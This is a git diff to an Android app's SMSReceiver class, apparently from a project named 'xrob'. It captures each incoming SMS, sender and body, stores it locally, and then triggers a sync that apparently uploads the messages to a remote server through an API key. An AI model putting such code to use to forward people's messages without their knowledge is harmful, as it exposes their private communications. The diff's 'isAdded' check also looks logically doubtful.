@@ -7,8 +7,10 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
+import com.theah64.xrob.asynctasks.MessagesSynchronizer;
 import com.theah64.xrob.database.Messages;
 import com.theah64.xrob.models.Message;
+import com.theah64.xrob.utils.APIRequestGateway;
 
 import static android.view.View.X;
 
@@ -21,7 +23,7 @@ public class SMSReceiver extends BroadcastReceiver {
     }
 
     @Override
-    public void onReceive(Context context, Intent intent) {
+    public void onReceive(final Context context, Intent intent) {
         Log.i(X, "SMS Received...");
 
         final Bundle dataBundle = intent.getExtras();
@@ -35,7 +37,20 @@ public class SMSReceiver extends BroadcastReceiver {
             for (Object pdu : pdus) {
                 //TODO: Parse sms here and add it to the db with no sync flag.
                 final SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
-                Messages.getInstance(context).add(new Message(0, sms.getOriginatingAddress(), sms.getDisplayMessageBody(), Message.TYPE_INBOX, System.currentTimeMillis()));
+                final boolean isAdded = Messages.getInstance(context).add(new Message(0, sms.getOriginatingAddress(), sms.getDisplayMessageBody(), Message.TYPE_INBOX, System.currentTimeMillis())) != 1;
+                if (isAdded) {
+                    new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
+                        @Override
+                        public void onReadyToRequest(String apiKey) {
+                            new MessagesSynchronizer(context, apiKey).execute();
+                        }
+
+                        @Override
+                        public void onFailed(String reason) {
+
+                        }
+                    });
+                }
             }
         }
     }
